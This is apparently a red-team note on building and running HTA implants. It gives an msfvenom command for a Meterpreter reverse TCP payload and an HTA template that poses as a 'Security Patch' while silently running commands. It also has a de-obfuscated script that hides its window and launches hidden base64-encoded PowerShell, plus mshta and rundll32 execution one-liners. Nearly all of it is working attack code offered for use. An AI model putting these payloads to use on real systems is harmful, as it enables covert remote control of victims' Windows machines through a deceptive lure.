# HTA

## 01 - Generate via `msfvenom`

> [!INFO] Title
> Contents

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f hta-psh -o implant.hta
```

## 02 - HTA Templates

HTA implant template.

```html
<html>
	<head>
		<title>
			Security Patch
		</title>
	</head>
	<body>
		<p>Installing security patch...</p>
	</body>
	<script language="VBScript">
	Function Execute()
		Set shell = CreateObject("WScript.Shell")
		shell.Run "<commands>", 0
	End Function

	Execute
	</script>
</html>
```

This is a de-obfuscated format of `hta-psh` in `msfvenom`. Refer to this [[03 - Malware Development/Techniques/Implant Execution/Command Execution/Execute Commands/Windows/WinAPI|section]] related to command execution using `powershell.exe`.

```html
<script language="VBScript">
  window.moveTo -4000, -4000
  Set Shell = CreateObject("WScript.Shell")
  Set Program = CreateObject("Scripting.FileSystemObject")
  For each path in Split(Shell.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If Program.FileExists(path + "\..\powershell.exe") Then
      Shell.Run "powershell -nop -w hidden -e <base64_encoded_powershell_script>", 0
      Exit For
    End If
  Next
  window.close()
</script>
```

## 03 - Execute Implant

### 3.1 - `mshta.exe`

To execute the implant.

```
C:\> mshta.exe %CD%\implant.hta

C:\> mshta.exe <drive_letter>:\absolute\path\to\implant.hta
```

### 3.2 - `rundll32.exe`

```
C:\> rundll32.exe ieframe.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"

C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"

C:\> rundll32.exe shdocvw.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"

C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\implant.hta"
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Windows/Manual/Living off the Land]]

### LOLBAS

- [LOLBAS: Mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)

- [LOLBAS: Rundll32](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)

### Red Team Notes

- [Red Team Notes: MSHTA](https://www.ired.team/offensive-security/code-execution/t1170-mshta-code-execution)

### Bohops

- [Bohops: Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement](https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/)